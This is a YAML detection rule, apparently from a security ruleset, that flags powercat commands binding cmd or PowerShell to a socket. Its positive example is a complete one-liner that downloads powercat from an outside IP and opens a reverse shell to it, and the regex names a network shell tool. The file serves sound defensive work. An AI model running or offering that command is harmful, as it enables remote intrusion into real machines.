- id: mention.tool_powercat_shell
  title: powercat client or listener executing a shell
  match:
    anchored: 'powercat {1,3}-(?:c|l)[^\n]{1,120}-e {1,3}(?:cmd|powershell)'
  case_sensitive: false
  strength: strong
  attack: [T1059.001, T1095]
  telemetry: [windows_text]
  source:
    name: powercat (besimorhino)
    url: https://github.com/besimorhino/powercat/blob/4e33fdfa2850a8940e46d0b69250ae3ba3a8c640/powercat.ps1
    license: Apache-2.0
    upstream_id: null
  rationale: >-
    powercat is netcat in PowerShell; '-c host -p port -e cmd' sends a shell and '-l -p port -e cmd' serves one.
    There is no administrative reason to bind cmd or PowerShell to a socket.
  examples:
    positive:
      - 'powershell -c "IEX (iwr http://203.0.113.7/powercat.ps1); powercat -c 203.0.113.7 -p 443 -e cmd"'
    negative:
      - 'powershell -c "powercat -l -p 8000 -of C:\Temp\recv.bin"'
      - 'powershell -c "Get-Help about_Remote"'

